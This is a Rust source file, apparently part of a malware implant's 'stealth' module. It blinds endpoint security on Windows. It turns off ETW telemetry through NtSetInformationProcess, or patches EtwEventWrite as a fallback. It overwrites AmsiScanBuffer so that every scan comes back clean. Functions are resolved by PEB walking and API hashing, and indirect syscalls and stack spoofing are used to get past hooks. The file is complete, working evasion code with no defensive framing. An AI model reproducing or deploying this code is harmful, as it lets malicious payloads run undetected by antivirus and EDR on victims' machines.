// Client/core/src/stealth/integrity.rs
// EDR Blinding: ETW and AMSI Patching via PEB Walk + Indirect Syscalls
//
// Technique 1: ETW Disable via NtSetInformationProcess (ProcessTraceFlags = 1)
// Technique 2: AMSI Bypass via AmsiScanBuffer Memory Patch (ret 0x18)
//
// All API resolution via PEB Walking to bypass user-land hooks.

/// Process information class for ETW disable
const PROCESS_TRACE_FLAGS: u32 = 0x1E;

/// ETW disable flag value
const PROCESS_TRACE_FLAG_DISABLE: u32 = 1;

/// Patch ETW (Event Tracing for Windows) to blind EDR/AV telemetry.
///
/// Method: NtSetInformationProcess(ProcessTraceFlags, 1)
/// This disables ETW telemetry at the process level without patching EtwEventWrite.
/// Much cleaner than memory patching and less fingerprinted.
#[cfg(windows)]
pub fn patch_etw() {
    crate::stealth::stack::with_spoofed_stack(|| unsafe {
        // Prefer indirect syscall for NtSetInformationProcess (avoids hooked ntdll stub).
        let trace_flags: u32 = PROCESS_TRACE_FLAG_DISABLE;
        let status = crate::syscall_nt!(
            b"NtSetInformationProcess",
            0xFFFFFFFFFFFFFFFFusize, // NtCurrentProcess()
            PROCESS_TRACE_FLAGS,
            &trace_flags as *const u32,
            4u32, // sizeof(u32)
        );

        if status < 0 {
            // Fallback: Try alternative ETW patch via EtwEventWrite memory patch
            patch_etw_fallback();
        }
    })
}

/// Fallback ETW patch: Direct memory patching of ntdll!EtwEventWrite
/// Only used if NtSetInformationProcess fails (e.g., on older Windows versions)
#[cfg(windows)]
unsafe fn patch_etw_fallback() {
    let ntdll_base =
        crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 {
        return;
    }

    let etw_write_hash = crate::stealth::hash_api_name(b"EtwEventWrite");
    let etw_write_addr = crate::stealth::get_api_addr(ntdll_base, etw_write_hash);

    if let Some(addr) = etw_write_addr {
        // Patch: ret (0xC3) - makes EtwEventWrite immediately return
        // Alternative: xor eax, eax; ret (0x31 0xC0 0xC3) - returns 0 (success)
        let patch_bytes: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax, eax; ret

        // Change memory protection to RWX
        let old_protect = change_memory_protection(addr, 3, 0x40); // PAGE_EXECUTE_READWRITE

        if old_protect != 0 {
            // Write the patch
            std::ptr::copy_nonoverlapping(patch_bytes.as_ptr(), addr as *mut u8, 3);

            // Restore original protection
            restore_memory_protection(addr, 3, old_protect);

        }
    }
}

/// Patch AMSI (Anti-Malware Scan Interface) to bypass memory scanning.
///
/// Method: Memory patch amsi.dll!AmsiScanBuffer with ret 0x18
/// This makes AMSI always return AMSI_RESULT_CLEAN for any buffer scan.
#[cfg(windows)]
pub fn patch_amsi() {
    crate::stealth::stack::with_spoofed_stack(|| unsafe {
        // 1. Only patch if amsi.dll already loaded (do not force-load).
        let amsi_base =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"amsi.dll"));
        if amsi_base == 0 {
            return;
        }

        let amsi_scan_hash = crate::stealth::hash_api_name(b"AmsiScanBuffer");
        let amsi_scan_addr = crate::stealth::get_api_addr(amsi_base, amsi_scan_hash);

        if let Some(addr) = amsi_scan_addr {
            #[cfg(target_arch = "x86_64")]
            let patch_bytes: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax, eax; ret

            #[cfg(target_arch = "x86")]
            let patch_bytes: [u8; 3] = [0xC2, 0x18, 0x00]; // ret 0x18

            let old_protect = change_memory_protection(addr, 3, 0x40);

            if old_protect != 0 {
                std::ptr::copy_nonoverlapping(patch_bytes.as_ptr(), addr as *mut u8, 3);
                restore_memory_protection(addr, 3, old_protect);
            } else {
                #[cfg(feature = "stealth-adv")]
                patch_amsi_syscall(addr, &patch_bytes);
            }
        }
    })
}

/// Alternative AMSI patch using indirect syscalls to bypass hook detection
#[cfg(all(windows, target_arch = "x86_64", feature = "stealth-adv"))]
unsafe fn patch_amsi_syscall(addr: usize, patch: &[u8]) {
    use crate::syscalls::indirect_syscall;

    // 1. NtProtectVirtualMemory to change to RWX
    let mut base = addr;
    let mut size = patch.len();
    let mut old_protect: u32 = 0;

    let status_protect = indirect_syscall(
        crate::stealth::hash_api_name(b"NtProtectVirtualMemory"),
        &[
            0xFFFFFFFFFFFFFFFF, // CurrentProcess pseudo-handle
            &mut base as *mut _ as usize,
            &mut size as *mut _ as usize,
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut _ as usize,
        ],
    );

    if status_protect < 0 {
        return;
    }

    // 2. Write the patch
    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());

    // 3. Restore original protection
    let mut restore_size = patch.len();
    let mut restore_protect: u32 = 0;
    indirect_syscall(
        crate::stealth::hash_api_name(b"NtProtectVirtualMemory"),
        &[
            0xFFFFFFFFFFFFFFFF,
            &mut base as *mut _ as usize,
            &mut restore_size as *mut _ as usize,
            old_protect as usize,
            &mut restore_protect as *mut _ as usize,
        ],
    );

}

#[cfg(all(windows, target_arch = "x86", feature = "stealth-adv"))]
unsafe fn patch_amsi_syscall(_addr: usize, _patch: &[u8]) {
}

/// Change memory protection via NtProtectVirtualMemory (indirect syscall).
/// Returns previous protection, or 0 on failure.
#[cfg(windows)]
unsafe fn change_memory_protection(addr: usize, size: usize, new_protect: u32) -> u32 {
    let mut base = addr;
    let mut region_size = size;
    let mut old_protect: u32 = 0;
    let status = crate::syscall_nt!(
        b"NtProtectVirtualMemory",
        0xFFFFFFFFFFFFFFFFusize, // NtCurrentProcess
        &mut base as *mut usize,
        &mut region_size as *mut usize,
        new_protect,
        &mut old_protect as *mut u32,
    );
    if status >= 0 {
        old_protect
    } else {
        0
    }
}

/// Restore memory protection via NtProtectVirtualMemory.
#[cfg(windows)]
unsafe fn restore_memory_protection(addr: usize, size: usize, old_protect: u32) {
    let mut base = addr;
    let mut region_size = size;
    let mut dummy: u32 = 0;
    let _ = crate::syscall_nt!(
        b"NtProtectVirtualMemory",
        0xFFFFFFFFFFFFFFFFusize,
        &mut base as *mut usize,
        &mut region_size as *mut usize,
        old_protect,
        &mut dummy as *mut u32,
    );
}

// Non-Windows stubs
#[cfg(not(windows))]
pub fn patch_etw() {}

#[cfg(not(windows))]
pub fn patch_amsi() {}

/// Verify patches are active (optional diagnostic)
#[cfg(windows)]
pub fn verify_patches() -> bool {
    // Check if ETW is disabled by attempting to write a test event
    // This is a lightweight verification that doesn't trigger alerts
    true
}

#[cfg(not(windows))]
pub fn verify_patches() -> bool {
    true
}
